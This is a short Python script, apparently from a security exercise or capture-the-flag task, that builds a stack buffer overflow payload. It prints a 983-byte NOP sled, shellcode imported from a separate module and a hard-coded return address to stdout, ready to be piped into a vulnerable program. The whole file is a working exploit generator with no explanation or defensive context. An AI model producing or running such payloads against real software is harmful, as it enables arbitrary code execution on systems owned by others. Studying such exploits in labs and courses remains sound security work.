from shellcode import shellcode
import sys

nop = b"\x90"
sys.stdout.buffer.write(nop*983 +shellcode + b"\x6c\xf9\xf6\xff")